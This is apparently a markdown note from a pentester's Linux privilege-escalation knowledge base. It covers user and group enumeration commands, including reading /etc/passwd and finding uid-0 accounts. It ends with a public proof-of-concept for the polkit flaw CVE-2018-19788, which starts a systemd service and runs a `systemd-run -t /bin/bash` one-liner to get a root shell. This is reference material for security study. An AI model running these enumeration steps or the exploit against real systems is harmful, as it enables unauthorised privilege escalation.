---
id: User Enumeration
aliases: []
tags:
  - Linux/Privesc/User-Enumeration
links: "[[Privesc]]"
---

<!-- User Enumeration {{{-->
# User Enumeration

Enumerate current user and group

___

<!-- Identify {{{-->
## Identify

[whoami](https://en.wikipedia.org/wiki/Whoami) —
Display the currently logged in user on the system

```sh
whoami
```

___
<!-- }}} -->

<!-- Discover {{{-->
## Discover

List users with console

```sh
cat /etc/passwd | grep "sh$"
```

List users (*including service users*)

```sh
cat /etc/passwd | cut -d: -f1
```

<!-- Home Directories {{{-->
#### Home Directories

Discover users and their home directories

```sh
ls /home
```

<!-- }}} -->

<!-- Login {{{-->
#### Login

[w](https://linux.die.net/man/1/w) —
List currently logged in users

```sh
w
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> w
> ```
>
> ```sh
>  12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
> USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
> cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
> ```
<!-- }}} -->

[last](https://linux.die.net/man/1/last) —
Show listing of last logged in users

```sh
last | tail
```

[lastlog](https://linux.die.net/man/8/lastlog) —
Report the most recent login of all users or of a given user

```sh
lastlog
```

```sh
lastlog -u <user>
```

<!-- }}} -->

<!-- Superusers {{{-->
#### Superusers

Discover [Superusers](https://en.wikipedia.org/wiki/Superuser)

```sh
awk -F: '($3 == "0") {print}' /etc/passwd
```

<!-- }}} -->

___
<!-- }}} -->

<!-- Group {{{-->
## Group

[groups](https://linux.die.net/man/1/groups) —
print the groups a user is in

```sh
groups [user]
```

<!-- Tip {{{-->
> [!tip]- Privileged Groups
>
> [[Group#Privileged Groups]]
<!-- }}} -->

<!-- }}} -->

<!-- id {{{-->
## id

Display the system identifications of a specified user

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Cyberciti - Linux/Unix id Command Examples](https://www.cyberciti.biz/faq/unix-linux-id-command-examples-usage-syntax/)
> - [IBM - id Command](https://www.ibm.com/docs/en/aix/7.3.0?topic=i-id-command)
<!-- }}} -->

[id](https://linux.die.net/man/1/id) —
Find a user’s
[UID](https://en.wikipedia.org/wiki/User_identifier) (*user ID*) or
[GID](https://en.wikipedia.org/wiki/Group_identifier) (*group ID*)
and other information

```sh
id [Username] id [options]
```

[id](https://linux.die.net/man/1/id) —
Current user

```sh
id
```

[id](https://linux.die.net/man/1/id) —
Specific user

```sh
id -u <user>
```

<!-- CVE-2018-19788 {{{-->
### CVE-2018-19788

[CVE-2018-19788](https://nvd.nist.gov/vuln/detail/CVE-2018-19788) —
[[Polkit]] `0.115` allows a user with a `uid` greater than `INT_MAX`
to successfully execute any systemctl command

```sh
systemd-run -t /bin/bash
```

<!-- Exploit {{{-->
> [!tip]- Exploit
>
> [GitHub - mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
>
> ```sh
> #!/bin/bash
> # PoC for CVE-2018-19788
> # Rich Mirch
> #
> # Write-up: https://blog.mirch.io/2018/12/09/cve-2018-19788-poc-polkit-improper-handling-of-user-with-uid-int_max-leading-to-authentication-bypass/
>
> cat >woot.service<<EOF
> [Unit]
> Description=Woot
>
> [Service]
> Type=notify
> ExecStart=/bin/bash -c "echo woot \$(id)|wall"
> KillMode=process
> Restart=on-failure
> RestartSec=42s
>
> [Install]
> WantedBy=multi-user.target
> EOF
>
> systemctl link $PWD/woot.service
> systemctl start woot
> ```
>
> One-liner (*source [Twitter - ParagonSEC](https://twitter.com/paragonsec/status/1071152249529884674)*)
>
> ```sh
> systemd-run -t /bin/bash
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->
